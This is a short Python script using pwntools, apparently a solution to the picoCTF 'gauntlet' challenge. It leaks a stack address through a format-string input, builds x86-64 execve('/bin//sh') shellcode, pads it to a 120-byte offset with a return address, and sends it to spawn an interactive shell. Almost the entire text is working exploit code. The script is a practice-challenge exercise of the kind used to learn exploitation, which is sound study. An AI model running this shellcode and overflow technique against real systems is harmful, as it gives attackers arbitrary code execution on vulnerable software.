from pwn import *

host = 'mercury.picoctf.net'
port = 1175

offset = 120

# p = remote(host, port)
p = process('./gauntlet')

shellcode = b'\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05'

p.sendline(b'%21$p')
addr = p.recvline().strip().decode()
addr = int(addr[2:], 16)
print(hex(addr))

addr = 0x6022a0
shellcode = shellcode + b'A'*(offset-len(shellcode)) + p64(addr)
with open('payload', 'wb') as fp:
	fp.write(b'ABCD\n')
	fp.write(shellcode + b'\x00'*8 + b'\n')

p.interactive()

p.sendline(shellcode)

# %25$p